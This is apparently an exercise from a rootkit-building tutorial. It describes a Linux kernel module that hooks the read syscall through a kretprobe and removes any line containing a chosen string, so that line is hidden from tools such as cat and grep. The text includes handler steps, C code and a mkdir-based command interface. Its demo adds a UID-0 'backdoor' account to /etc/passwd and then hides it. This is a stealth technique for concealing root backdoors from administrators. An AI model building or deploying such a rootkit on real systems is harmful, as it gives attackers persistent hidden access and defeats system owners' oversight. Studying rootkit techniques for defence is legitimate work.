# Remove matching lines from file reads

Tools like `cat`, `grep`, and `ss` all read files through the `read` syscall.
Intercept read, scan the returned text buffer for lines that
contain a target string, and remove those lines in place. The result: any
line mentioning a hidden string vanishes from every text-reading tool.

## The interception pattern

Same approach as the dirent filter, applied to text:

1. **Kretprobe on ksys_read** (or `__x64_sys_read`).

2. **entry_handler**: save the user-space buffer pointer and requested count
   from the registers.

3. **return_handler**: read the actual byte count from the return value. If
   zero or negative, skip. Otherwise:
   - `copy_from_user` the buffer into a kernel allocation.
   - Walk the buffer line by line using `memchr` to find newline characters.
   - For each line: check if it contains any string in content_targets
     (use `strnstr`).
   - If a line matches: `memmove` to close the gap, subtract the line length
     from the total.
   - `copy_to_user` the filtered buffer.
   - `regs_set_return_value` with the new byte count.

## Line walking

Text buffers are not null-terminated. You work with a byte count and `memchr`:

```c
char *pos = kbuf;
char *end = kbuf + total;
while (pos < end) {
    char *nl = memchr(pos, '\n', end - pos);
    // line_len includes the newline
    int line_len = nl ? (nl - pos + 1) : (end - pos);
    // check this line
    pos += line_len;
}
```

To check if a line contains a target string, use `strnstr(line, target,
line_len)`. This is a length-bounded search, safe for non-terminated buffers.

## Command interface

Two mkdir commands:

- `mkdir rklings.h.c.<string>`: add string to content_targets
- `mkdir rklings.u.c.<idx>`: remove content_targets entry by index

## Demo

```sh
$ echo "backdoor:x:0:0::/root:/bin/bash" >> /etc/passwd
$ cat /etc/passwd | grep backdoor
backdoor:x:0:0::/root:/bin/bash
$ mkdir rklings.h.c.backdoor
$ cat /etc/passwd | grep backdoor
(no output)
$ mkdir rklings.u.c.0
$ cat /etc/passwd | grep backdoor
backdoor:x:0:0::/root:/bin/bash
```

## Verify

Add a target string, confirm `cat` of a file containing that string no longer
shows the matching line. Remove the target and confirm the line returns.
